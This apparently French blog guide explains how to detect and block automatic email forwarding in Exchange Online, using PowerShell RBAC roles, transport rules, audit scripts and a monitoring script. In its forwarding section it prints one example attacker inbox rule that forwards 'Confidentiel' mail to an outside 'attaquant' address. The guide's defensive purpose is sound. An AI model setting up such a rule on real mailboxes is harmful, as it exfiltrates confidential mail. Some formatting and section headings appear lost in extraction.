---
title: "Exchange Online : Bloquer les transferts automatiques d'emails (Guide 2025)"
pubDatetime: "2025-06-14T20:02:20+02:00"
author: Brandon Visca
description: "Guide PowerShell Exchange Online sécurité : bloquer redirection email Office 365 et transferts automatiques. Transport Rules, RBAC, scripts d''audit et ..."
tags:
  - microsoft-365
  - securite
  - intermediaire
  - exchange-online
  - powershell
  - guide
---


- [Introduction](#introduction-1)
- [Pourquoi c’est un problème majeur en 2025](#pourquoi-cest-un-probleme-majeur-en-2025)
- [Les deux canaux de transfert à maîtriser](#les-deux-canaux-de-transfert-a-maitriser)
  - [1. Redirection globale de boîte (ForwardingAddress)](#1-redirection-globale-de-boite-forwarding-address)
  - [2. Règles de boîte conditionnelles (InboxRule)](#2-regles-de-boite-conditionnelles-inbox-rule)
- [Méthode 1 : RBAC – Limiter l’accès aux interfaces](#methode-1-rbac-limiter-lacces-aux-interfaces)
  - [Créer un rôle personnalisé](#creer-un-role-personnalise)
  - [Créer et appliquer la policy](#creer-et-appliquer-la-policy)
  - [Appliquer en masse](#appliquer-en-masse)
- [Méthode 2 : Transport Rules – Le vrai blocage (PowerShell Exchange Online sécurité)](#methode-2-transport-rules-le-vrai-blocage-power-shell-exchange-online-securite)
  - [La règle ultime](#la-regle-ultime)
  - [Paramètres expliqués](#parametres-expliques)
  - [Version avancée avec logging](#version-avancee-avec-logging)
- [Audit et détection des transferts actifs (PowerShell Exchange Online)](#audit-et-detection-des-transferts-actifs-power-shell-exchange-online)
  - [Scanner les ForwardingAddress](#scanner-les-forwarding-address)
  - [Scanner les InboxRules suspectes](#scanner-les-inbox-rules-suspectes)
  - [Suppression en masse (avec précaution)](#suppression-en-masse-avec-precaution)
- [Script de monitoring automatisé](#script-de-monitoring-automatise)
- [Communication avec les utilisateurs](#communication-avec-les-utilisateurs)
- [Bonnes pratiques et recommandations](#bonnes-pratiques-et-recommandations)
  - [Stratégie de déploiement progressive](#strategie-de-deploiement-progressive)
  - [Liste blanche à prévoir](#liste-blanche-a-prevoir)
  - [Surveillance continue](#surveillance-continue)
- [Conclusion](#conclusion-et-ouverture)


![Illustration 1 — Exchange Online](great-job-al0xsyu0pkftq.gif)

Introduction

Les **transferts automatiques d’emails vers l’extérieur** ? Un cauchemar pour tout admin système qui se respecte. Si vous gérez un tenant **Exchange Online**, vous avez probablement déjà eu cette sueur froide en découvrant qu’un utilisateur a configuré une **redirection email** vers sa boîte perso… avec toutes les données sensibles qui sortent en prime.

Microsoft n’a pas exactement facilité les choses avec ses multiples canaux de transfert et ses interfaces qui donnent l’illusion de contrôle. Mais rassurez-vous : avec les bonnes commandes **PowerShell Exchange Online** et une stratégie claire, on peut verrouiller ça proprement.

Dans ce guide, je vous montre comment **bloquer efficacement tous les transferts automatiques** dans Exchange Online, détecter ceux déjà en place, et mettre en place un monitoring automatisé. Du RBAC aux Transport Rules en passant par l’audit, on couvre tout avec **PowerShell Exchange Online sécurité**.

Pourquoi c’est un problème majeur en 2025

Avant de foncer tête baissée dans les commandes, comprenons pourquoi Microsoft nous complique la vie avec ses transferts.

Les risques sont multiples et bien réels :

**🔓 Fuite de données incontrôlée**  
Vos emails confidentiels partent vers Gmail, Yahoo ou pire… sans aucune traçabilité.

**🛡️ Contournement des protections**  
ATP (Advanced Threat Protection), DLP, audit logs… tout ça devient inutile si les mails sont redirigés.

**⚖️ Non-conformité RGPD**  
L’entreprise perd la maîtrise de l’information. Bonjour l’amende de la CNIL.

**🎯 Vecteur d’exfiltration**  
Un attaquant peut créer discrètement une règle de transfert pour siphonner vos données.

> **💡 À savoir :** Les cyberattaquants utilisent de plus en plus les règles de transfert automatique pour exfiltrer des données après une intrusion. C’est discret et difficile à détecter.

Les deux canaux de transfert à maîtriser

Exchange Online propose deux mécanismes distincts pour rediriger automatiquement des emails :

### 1. Redirection globale de boîte (ForwardingAddress)

Cette méthode redirige **tous** les emails reçus vers une adresse externe :

```bash
# Via l'interface OWA ou en PowerShell
Set-Mailbox prenom.nom@domaine.com -ForwardingSmtpAddress "externe@gmail.com"

```

# Exemple de règle pernicieuse
New-InboxRule -Name "Forward Important" -SubjectContainsWords "Confidentiel" -ForwardTo "attaquant@externe.com"


**Caractéristiques :**

- Transfert conditionnel (expéditeur, sujet, mots-clés…)
- Plus difficiles à détecter
- Configurables uniquement par l’utilisateur
- Gérées via `Get-InboxRule`

Méthode 1 : RBAC – Limiter l’accès aux interfaces

![Capture d'écran — 1 Redirection globale de boîte ForwardingAddress](theoffice-zcpyqh5yvhdi1rvype.gif)Le RBAC (Role-Based Access Control) permet de retirer les boutons de transfert des interfaces utilisateur. C’est un premier verrou, mais attention aux limitations.

### Créer un rôle personnalisé

```bash
# Étape 1 : Créer un rôle basé sur MyBaseOptions
New-ManagementRole -Name "MyBaseOptions-NoForward" -Parent "MyBaseOptions"

# Étape 2 : Supprimer les paramètres dangereux
Set-ManagementRoleEntry "MyBaseOptions-NoForward\Set-Mailbox" -RemoveParameter -Parameters @(
    "ForwardingAddress",
    "ForwardingSmtpAddress", 
    "DeliverToMailboxAndForward"
)

```

# Étape 3 : Créer une policy utilisateur
New-RoleAssignmentPolicy -Name "PolicyNoEmailForward" -Roles @(
    "MyContactInformation",
    "MyRetentionPolicies", 
    "MyBaseOptions-NoForward",
    "MyTextMessaging"
)

# Étape 4 : Appliquer à une boîte
Set-Mailbox prenom.nom@domaine.com -RoleAssignmentPolicy "PolicyNoEmailForward"


> **⚠️ Erreur fréquente :** Le RBAC ne bloque PAS les transferts configurés par un admin, ni les InboxRules, ni les transferts déjà existants. C’est juste cosmétique au niveau interface.

### Appliquer en masse

```bash
# Appliquer la policy à toutes les boîtes utilisateur
Get-Mailbox -RecipientTypeDetails UserMailbox | Set-Mailbox -RoleAssignmentPolicy "PolicyNoEmailForward"

```

New-TransportRule -Name "Block-Auto-Forwarding" `
  -SentToScope NotInOrganization `
  -FromScope InOrganization `
  -MessageType AutoForward `
  -ExceptIfFrom @("admin@votredomaine.com", "service@votredomaine.com") `
  -RejectMessageReasonText "Le transfert automatique vers l'extérieur est interdit par la politique de sécurité."


### Paramètres expliqués

Paramètre | Description | Pourquoi c’est important | `FromScope InOrganization` | Emails provenant de votre organisation | Évite de bloquer les emails légitimes entrants | `SentToScope NotInOrganization` | Destinataire externe | Cible uniquement les sorties vers l’extérieur | `MessageType AutoForward` | Messages transférés automatiquement | Distingue transfert auto vs transfert manuel | `ExceptIfFrom` | Liste blanche d’expéditeurs | Permet les transferts légitimes (comptes de service) | 

### Version avancée avec logging

```bash
New-TransportRule -Name "Block-Auto-Forwarding-Advanced" `
  -SentToScope NotInOrganization `
  -FromScope InOrganization `
  -MessageType AutoForward `
  -ExceptIfFrom @("admin@votredomaine.com") `
  -RejectMessageReasonText "Transfert automatique bloqué. Contactez le support IT." `
  -GenerateIncidentReport "admin@votredomaine.com" `
  -IncidentReportContent @("Sender", "Recipients", "Subject", "MessageHeaders")

```

# Trouver toutes les boîtes avec redirection active
$ForwardingMailboxes = Get-Mailbox -ResultSize Unlimited | Where-Object {
    $_.ForwardingSmtpAddress -or $_.ForwardingAddress
} | Select-Object DisplayName, ForwardingAddress, ForwardingSmtpAddress, PrimarySmtpAddress

# Afficher les résultats
$ForwardingMailboxes | Format-Table -AutoSize

# Exporter en CSV pour analyse
$ForwardingMailboxes | Export-Csv "C:\temp\forwarding-audit.csv" -NoTypeInformation


### Scanner les InboxRules suspectes

```bash
# Scanner toutes les règles de transfert
$SuspiciousRules = @()

Get-Mailbox -ResultSize Unlimited | ForEach-Object {
    $Mailbox = $_
    $Rules = Get-InboxRule -Mailbox $Mailbox.Alias | Where-Object {
        $_.ForwardTo -or $_.RedirectTo
    }
    
    foreach ($Rule in $Rules) {
        $SuspiciousRules += [PSCustomObject]@{
            Mailbox = $Mailbox.DisplayName
            Email = $Mailbox.PrimarySmtpAddress
            RuleName = $Rule.Name
            ForwardTo = $Rule.ForwardTo -join "; "
            RedirectTo = $Rule.RedirectTo -join "; "
            Enabled = $Rule.Enabled
        }
    }
}

# Afficher et exporter
$SuspiciousRules | Format-Table -AutoSize
$SuspiciousRules | Export-Csv "C:\temp\inbox-rules-audit.csv" -NoTypeInformation

```

# ATTENTION : Testez d'abord sur quelques boîtes !

# Supprimer toutes les redirections ForwardingAddress
Get-Mailbox -ResultSize Unlimited | Where-Object {
    $_.ForwardingSmtpAddress -or $_.ForwardingAddress
} | Set-Mailbox -ForwardingAddress $null -ForwardingSmtpAddress $null

# Supprimer les InboxRules de transfert (plus délicat)
Get-Mailbox -ResultSize Unlimited | ForEach-Object {
    $Rules = Get-InboxRule -Mailbox $_.Alias | Where-Object {
        $_.ForwardTo -or $_.RedirectTo
    }
    $Rules | Remove-InboxRule -Confirm:$false
}


Script de monitoring automatisé

Créez un script PowerShell planifiable pour détecter quotidiennement les nouveaux transferts :

```bash
# Script : Monitor-EmailForwarding.ps1
param(
    [string]$ReportPath = "C:\Scripts\Reports",
    [string]$AdminEmail = "admin@votredomaine.com"
)

# Connexion Exchange Online
Connect-ExchangeOnline -ShowProgress $false

$Date = Get-Date -Format "yyyy-MM-dd"
$Report = @()

# Scan ForwardingAddress
$ForwardingBoxes = Get-Mailbox -ResultSize Unlimited | Where-Object {
    $_.ForwardingSmtpAddress -or $_.ForwardingAddress
}

foreach ($Box in $ForwardingBoxes) {
    $Report += [PSCustomObject]@{
        Type = "ForwardingAddress"
        Mailbox = $Box.DisplayName
        Email = $Box.PrimarySmtpAddress
        Target = $Box.ForwardingSmtpAddress
        Details = "Redirection globale active"
        Date = $Date
    }
}

# Scan InboxRules
Get-Mailbox -ResultSize Unlimited | ForEach-Object {
    $Mailbox = $_
    $Rules = Get-InboxRule -Mailbox $Mailbox.Alias | Where-Object {
        $_.ForwardTo -or $_.RedirectTo
    }
    
    foreach ($Rule in $Rules) {
        $Report += [PSCustomObject]@{
            Type = "InboxRule"
            Mailbox = $Mailbox.DisplayName
            Email = $Mailbox.PrimarySmtpAddress  
            Target = ($Rule.ForwardTo + $Rule.RedirectTo) -join "; "
            Details = "Règle: $($Rule.Name)"
            Date = $Date
        }
    }
}

# Générer le rapport
$ReportFile = "$ReportPath\EmailForwarding-$Date.csv"
$Report | Export-Csv $ReportFile -NoTypeInformation

# Envoyer par email si détections
if ($Report.Count -gt 0) {
    $Subject = "ALERTE : $($Report.Count) transfert(s) d'email détecté(s)"
    $Body = "Transferts détectés le $Date. Voir fichier joint."
    
    Send-MailMessage -To $AdminEmail -Subject $Subject -Body $Body -Attachments $ReportFile -SmtpServer "smtp.office365.com" -Port 587 -UseSsl
}

Write-Host "Scan terminé. $($Report.Count) transfert(s) détecté(s)."

```

# Exemples d'exceptions courantes
$WhitelistedAccounts = @(
    "noreply@votredomaine.com",     # Comptes de service
    "notifications@votredomaine.com", # Notifications automatiques  
    "support@votredomaine.com"      # Support client
)


### Surveillance continue

- Script de monitoring quotidien
- Alertes en temps réel sur nouvelles règles
- Rapport mensuel pour la direction
- Formation utilisateurs régulière

> **💡 Astuce pro :** Créez un groupe de sécurité « ForwardingExceptions » dans Azure AD pour gérer facilement la liste blanche via les groupes plutôt qu’en dur dans les scripts.

Conclusion

Bloquer les transferts automatiques dans Exchange Online demande une approche méthodique combinant RBAC, Transport Rules et monitoring. C’est un incontournable de la sécurité email en 2025, surtout avec la multiplication des cyberattaques ciblant les messageries d’entreprise.

L’implémentation que je vous ai présentée vous donne un contrôle total sur les flux sortants, mais n’oubliez pas l’aspect humain : vos utilisateurs ont besoin d’alternatives pratiques. Un bon déploiement s’accompagne toujours de formation et d’outils adaptés.

Dans un prochain guide, nous verrons comment aller plus loin avec la **protection contre l’exfiltration de données via SharePoint et OneDrive**. Car spoiler alert : les transferts emails ne sont qu’une partie du problème…

- - - - - -

**💬 Une question sur ce guide ?** N’hésitez pas à me contacter ou à laisser un commentaire. J’ai probablement déjà rencontré votre cas de figure !

## Articles connexes

- [Vaultwarden avec Docker : Gestionnaire de Mots de Passe Grat](/vaultwarden-docker-gestionnaire-mots-de-passe/)
- [Masquer des utilisateurs de la GAL Office 365 + Active Direc](/masquer-utilisateurs-gal-office365-active-directory/)
